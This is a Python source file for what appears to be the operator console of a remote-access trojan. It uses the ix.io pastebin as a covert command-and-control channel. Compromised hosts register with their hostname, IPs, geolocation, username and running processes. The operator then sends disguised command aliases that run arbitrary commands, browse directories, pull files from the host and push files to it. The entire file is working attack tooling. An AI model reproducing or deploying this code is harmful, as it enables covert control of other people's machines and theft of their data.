#!/usr/bin/python

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Cipher import AES
import base64
import zlib
import hashlib
import random
import time
import json
import os
import socket
import platform
import pygeoip
from urllib2 import urlopen
import getpass
import psutil
import requests
import unicodedata
import re


class shellClient:

    def __init__(self):
        #get current working directory...
        self.cwd = str(os.getcwd())
        self.os = platform.system()
        self.fs = "/"
        if self.os == "Windows":
            self.fs = "\\"

        #current instance information
        self.messageSeparator = "abcde"

        #instance ID
        self.idFile = self.cwd + self.fs + "id.txt"

        #geoip data
        self.geoipData = self.cwd + self.fs + "GeoLiteCity.dat"

        #recipient files
        self.recipientKeyFile = None
        self.recipientKeyDir = self.cwd + self.fs + "public_keys"
        self.recipientsFile = self.cwd + self.fs + "recipients.txt"

        self.info = {
            "keyID": self.getMyID(),
            "hostname": socket.gethostname(),
            "localIP": self.getLocalIP(),
            "IP": urlopen('http://ip.42.pl/raw').read(),
            "location": self.getIPLocation(urlopen('http://ip.42.pl/raw').read()),
            "os": str(platform.system()) + " " + str(platform.release()),
            "username": getpass.getuser(),
            "processes": self.getProcesses()
            }

        self.linkREGEX = re.compile(r"\<a\shref\=\"\/(?P<chars>[a-zA-Z0-9]*?)\/\"\>\[h\]\<\/a\>\s\s\s\s\s" + re.escape(self.info["keyID"]))

        #key config
        self.keysize = 4096
        self.privateKeyFile = self.cwd + self.fs + "priv.key"
        self.publicKeyDir = self.cwd + self.fs + "public_keys"
        self.publicKeyFile = self.publicKeyDir + self.fs + self.info["keyID"] + ".key"

        #actual keys
        self.privateKey = None
        self.publicKey = None

        #current recipient
        self.recipient = {
            "keyID": None,
            "key": None,
            "hostname": None,
            "localIP": None,
            "IP": None,
            "location": None,
            "os": None,
            "username": None,
            "processes": None
            }

        self.recipients = None

        #downloads folder
        self.downloadsFolder = self.cwd + self.fs + "Downloads"

        #logging
        self.logging = True
        self.logfile = self.cwd + self.fs + "log.txt"

        #links
        self.linksFile = self.cwd + self.fs + "links.txt"
        self.links = list()

        #AES Info
        self.aesBlockSize = 16
        self.padding = "{"
        self.secretKey = "$RFV%TGB^YHN&UJM"

        #command aliases
        self.keyExchangeAlias = "agdke123"
        self.cdAlias = "dhjsdn445"
        self.lsAlias = "jdkfakldskjla"
        self.execAlias = "90thker99999hjk"
        self.pwdAlias = "jkfs998908"
        self.getAlias = "bjksdi9043hkdn"
        self.putAlias = "nfdaouo89432bbbb42jhk8"

    def encodeAES(self, string):
        cipher = AES.new(self.secretKey)
        s = string + (self.aesBlockSize - len(string) % self.aesBlockSize) * self.padding
        return cipher.encrypt(s)

    def decodeAES(self, ciphertext):
        cipher = AES.new(self.secretKey)
        return cipher.decrypt(ciphertext).rstrip(self.padding)

    def getProcesses(self):
        procs = list()
        for proc in psutil.process_iter():
            try:
                pinfo = proc.as_dict(attrs=['pid', 'name', 'username'])
            except psutil.NoSuchProcess:
                pass
            else:
                procs.append(pinfo)
        return procs

    def getLocalIP(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # doesn't even have to be reachable
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except:
            IP = '127.0.0.1'
        finally:
            s.close()
        return IP

    def generateID(self):
        random.seed(time.time())
        myID = hashlib.sha224(str(random.random())).hexdigest()
        return myID

    def getIPLocation(self, IP):
        rawdata = pygeoip.GeoIP(self.geoipData)
        data = rawdata.record_by_name(IP)
        return data

    def getMyID(self):
        if os.path.exists(self.idFile):
            myID = self.load(self.idFile)
            return myID
        else:
            myID = self.generateID()
            self.save(myID, self.idFile)
            return myID

    def save(self, contents, filename):
        fo = open(filename, "w+")
        fo.write(contents)
        fo.close()

    def append(self, contents, filename):
        fo = open(filename, "a")
        fo.write(contents)
        fo.close()

    def load(self, filename):
        str1 = ""
        fo = open(filename, "r")
        for Line in fo.readlines():
            str1 = str1 + str(Line)
        return str1

    def main(self):
        self.log("loading data...")
        #load data
        try:
            self.log("loading keys")
            self.loadKeys()
        except:
            self.log("couldn't load keys.  Do they exist?")
        try:
            self.log("loading recipients")
            self.loadRecipients()
        except:
            self.log("couldn't load recipients.  Do they exist?")
        try:
            self.log("loading links")
            self.loadLinks()
        except:
            self.log("couldn't load links.  Do they exist?")

        #self.testEncryption()

        #register new servers
        self.log("looking for new servers...")
        self.getMessagesFromIXIO()

        #pick a server
        index = 0
        print("choose a server... ")
        for r in self.recipients:
            print "[" + str(index) + "]:    IP: " + r["IP"] + "\n" + "        Username: " + r["username"] + "\n" + "        ID: " + r["keyID"] + "\n"
            index += 1
        self.recipient = self.recipients[int(input("Enter an index: "))]
        print(self.recipient)
        print "You selected index 0: "

        location = eval(self.recipient["location"])

        #print useful info
        print "Username: " + str(self.recipient["username"])
        print "ID: " + str(self.recipient["keyID"])
        print "City: " + str(location["metro_code"])
        print "Country: " + str(location["country_name"])
        print "OS: " + str(self.recipient["os"])
        print "IP: " + str(self.recipient["IP"])
        print "Local IP: " + str(self.recipient["localIP"])
        print "Hostname: " + str(self.recipient["hostname"])

        #main loop
        while True:
            #get commands from user input
            cmd = raw_input(str(self.recipient["username"]) + "@" + str(self.recipient["hostname"]) + "_$: ")
            print "command is: " + cmd
            self.commander(str(cmd).rstrip())
            #look for new messages
            #messageList = self.getMessagesFromIXIO()
            #print messageList
            #time.sleep(30)

    def commander(self, cmd):

        alias = ""
        body = "NULL"
        file1 = None
        if cmd == "help":
            print "Available Commands:"
            print "cd (change directory)"
            print "ls (list current directory)"
            print "exec (execute a command on the underlying os)"
            print "pwd (get current directory)"
            print "get (download a file from the host)"
            print "put (upload a file to the host)"
            print "listen (listen on a specified port for netcat like functionality)"
            print "connect (connect to a specified port on another host for netcat like functionality)"
            print "ipscan (scan subnet for other hosts)"
            print "portscan (scan host for open ports)"
        elif cmd == "cd":
            alias = self.cdAlias
            body = raw_input("Which directory would you like to switch to? ")
        elif cmd == "ls":
            alias = self.lsAlias
        elif cmd == "exec":
            alias = self.execAlias
            body = raw_input("What command would you like to execute? ")
        elif cmd == "pwd":
            alias = self.pwdAlias
        elif cmd == "get":
            alias = self.getAlias
            body = raw_input("What file would you like to possess? ")
        elif cmd == "put":
            alias = self.putAlias
            file1 = raw_input("What is the path to the file you would like to upload? ")

        #send command to server
        self.sendMessageToIXIO(subject=alias, message=str(body), toAddr=self.recipient["keyID"], attachment=file1)

        reply = False
        messages = None

        #get response from server
        while reply is False:
            time.sleep(random.randint(3, 16))
            messages = self.getMessagesFromIXIO()

            for message in messages:
                print(message)
                if message["subject"] is not self.keyExchangeAlias:
                    reply = True

    def testEncryption(self):
        print "testing encryption"
        ct = self.encrypt(self.info["keyID"], "test")
        print self.decrypt(ct)

    def generateKey(self):
        self.privateKey = RSA.generate(self.keysize, e=65537)
        self.savePrivateKey()
        self.publicKey = self.privateKey.publickey()
        self.savePublicKey()

    def savePrivateKey(self):
        self.save(self.privateKey.exportKey(format='PEM'), self.privateKeyFile)

    def savePublicKey(self):
        if os.path.exists(self.publicKeyDir):
            self.save(self.publicKey.exportKey(format='PEM'), self.publicKeyFile)
        else:
            os.mkdir(self.publicKeyDir)
            self.save(self.publicKey.exportKey(format='PEM'), self.publicKeyFile)

    def saveRecipientPublicKey(self, index):
        r = self.recipients[index]
        print self.recipientKeyDir
        print self.fs
        print r["keyID"]
        self.recipientKeyFile = self.recipientKeyDir + self.fs + r["keyID"] + ".key"
        self.log("saving recipient public key to: " + str(self.recipientKeyFile))
        self.save(r["key"], self.recipientKeyFile)


    def loadKeys(self):
        try:
            self.privateKey = RSA.importKey(self.load(self.privateKeyFile))
            self.publicKey = RSA.importKey(self.load(self.publicKeyFile))
        except:
            self.generateKey()

    def loadRecipients(self):
        l1 = ""
        fo = open(self.recipientsFile, "r")
        self.recipients = json.loads(fo.read())
        return l1

    #def listRecipientsByName():

    def encrypt(self, keyID, plaintext):
        self.recipientKeyFile = self.publicKeyDir + "/" + keyID + ".key"
        key = RSA.importKey(self.load(self.recipientKeyFile))
        rsa_key = PKCS1_OAEP.new(key)

        blob = zlib.compress(plaintext)
        blocksize = 470
        offset = 0
        endloop = False
        encrypted = ""

        while not endloop:
            #The chunk
            block = blob[offset:offset + blocksize]

            #If the data chunk is less then the chunk size, then we need to add
            #padding with " ". This indicates the we reached the end of the file
            #so we end loop here
            if len(block) % blocksize != 0:
                endloop = True
                block += " " * (blocksize - len(block))

            #Append the encrypted chunk to the overall encrypted file
            encrypted += rsa_key.encrypt(block)

            #Increase the offset by chunk size
            offset += blocksize

        #Base 64 encode the encrypted file
        return base64.urlsafe_b64encode(encrypted)

    def decrypt(self, cyphertext):

        rsa_key = PKCS1_OAEP.new(self.privateKey)

        encrypted = base64.urlsafe_b64decode(cyphertext)

        blocksize = 512
        offset = 0
        decrypted = ""

        while offset < len(encrypted):
            #The chunk
            block = encrypted[offset: offset + blocksize]

            #Append the decrypted chunk to the overall decrypted file
            decrypted += rsa_key.decrypt(block)

            #Increase the offset by chunk size
            offset += blocksize

        #return the decompressed decrypted data
        return zlib.decompress(decrypted)

    def sendMessageToIXIO(self, message, attachment=None, toAddr="", fromAddr="", subject="test", keyExchange=False):
        entry = dict()
        entry["subject"] = str(subject)
        entry["message"] = str(message)
        if fromAddr is not "":
            entry["fromAddr"] = str(fromAddr)
        else:
            entry["fromAddr"] = str(self.info["keyID"])
        entry["toAddr"] = str(toAddr)

        if attachment is not None:
            head, tail = os.path.split(str(attachment))
            entry["filename"] = tail
            with open(str(attachment)) as f1:
                entry["attachment"] = base64.urlsafe_b64encode(f1.read())
        else:
            entry["filename"] = None
            entry["attachment"] = None

        #turn entry into json
        entryJson = json.dumps(entry)
        self.log(entryJson)
        if keyExchange is False:
            if toAddr is not "":
                cipherText = self.encrypt(toAddr, str(entryJson))
                print cipherText
                #send entry to ix.io
                params = {"f:1": str(cipherText), "name:1": str(toAddr) + base64.urlsafe_b64encode(str(time.time())), "read:1": "1"}
                #if self.useragent == "":
                    #self.setUserAgent()
                #user_agent = {'User-agent': self.useragent}
                #response = requests.post("http://ix.io", headers=user_agent, data=params)
                response = requests.post("http://ix.io", data=params)
                print(response.text)
            else:
                cipherText = str(self.encodeAES(entryJson)) + str(self.messageSeparator) + str(hashlib.sha256(str(time.time())).hexdigest())
                hash1 = hashlib.sha256(str(time.time())).hexdigest()
                params = {"f:1": base64.urlsafe_b64encode(str(cipherText)), "name:1": "all" + str(hash1), "read:1": "1"}
                #if self.useragent == "":
                    #self.setUserAgent()
                #user_agent = {'User-agent': self.useragent}
                #response = requests.post("http://ix.io", headers=user_agent, data=params)
                response = requests.post("http://ix.io", data=params)
                print(response.text)
        else:
            cipherText = str(base64.urlsafe_b64encode(self.encodeAES(entryJson))) + str(self.messageSeparator) + str(hashlib.sha256(str(time.time())).hexdigest())
            params = {"f:1": base64.urlsafe_b64encode(str(cipherText)), "name:1": self.keyExchangeAlias + str(toAddr) + base64.urlsafe_b64encode(str(time.time())), "read:1": "1"}
            #if self.useragent == "":
                #self.setUserAgent()
            #user_agent = {'User-agent': self.useragent}
            #response = requests.post("http://ix.io", headers=user_agent, data=params)
            response = requests.post("http://ix.io", data=params)
            print(response.text)

    def getMessagesFromIXIO(self):
        self.loadLinks()
        messageList = list()
        html = ""
        #get message from ix.io
        try:
            html = requests.get("http://ix.io/user/").text
            html = unicodedata.normalize('NFKD', html).encode('ascii', 'ignore')
        except:
            self.log("ix.io connection error")

        #self.log("ix.io source:")
        #self.log(html)

        matches = self.linkREGEX.finditer(str(html))
        for m in matches:
            self.log("found a link...")
            if m is not None:
                chars = m.group("chars")
                link = "http://ix.io/" + str(chars)
                self.log(link)
                if link not in self.links:
                    if True:
                        self.log("link match: " + str(link))
                        self.links.append(link)
                        self.saveLinks()
                        cipherText = str(requests.get(link).text).split(self.messageSeparator)[0]
                        entryJson = self.decrypt(cipherText)
                        #dump json to dictionary
                        entry = json.loads(entryJson)
                        messageList.append(entry)
                    else:
                        self.log("shitty link")
                else:
                    self.log("link already visited")
        for message in messageList:
            self.log(message)
            if self.keyExchangeAlias in str(message["subject"]):
                self.log("registering server")
                self.registerNewServer(json.loads(str(message["message"])))
        return messageList

    def registerNewServer(self, newServer):
        index = 0
        if self.recipients is not None:
            for r in self.recipients:
                if str(r["keyID"]) == str(newServer["keyID"]):
                    self.log("already registered, re-registering")
                    self.recipients[index] = newServer
                    self.saveRecipient()
                    self.saveRecipientPublicKey(index)
                    return True
                index += 1
        else:
            self.recipients = list()
            self.recipients.append(newServer)
            index = self.recipients.index(newServer)
            self.saveRecipient()
            self.saveRecipientPublicKey(index)
            return True
        self.recipients.append(newServer)
        index = self.recipients.index(newServer)
        self.saveRecipient()
        self.saveRecipientPublicKey(index)
        return True

    def saveRecipient(self):
        #save recipients to a file.
        self.log("saving recipients")
        f1 = open(self.recipientsFile, "w")
        f1.write(json.dumps(self.recipients))
        f1.close()

    def saveLinks(self):
        f1 = open(self.linksFile, "w")
        f1.write(json.dumps(self.links))
        f1.close()

    def loadLinks(self):
        try:
            f1 = open(self.linksFile, "r")
            self.links = json.loads(f1.read())
            f1.close()
        except:
            self.log("cannot load links: does the links file exist?")

    def log(self, message):
        if self.logging is True:
            t = time.strftime("%m/%d/%Y %H:%M:%S")
            f = open(self.logfile, "a")
            f.write(str(t) + ": " + str(message) + "\n")
            print str(t) + ": " + str(message)
            f.close()
        else:
            t = time.strftime("%m/%d/%Y %H:%M:%S")
            print str(t) + ": " + str(message)


s = shellClient()
s.main()

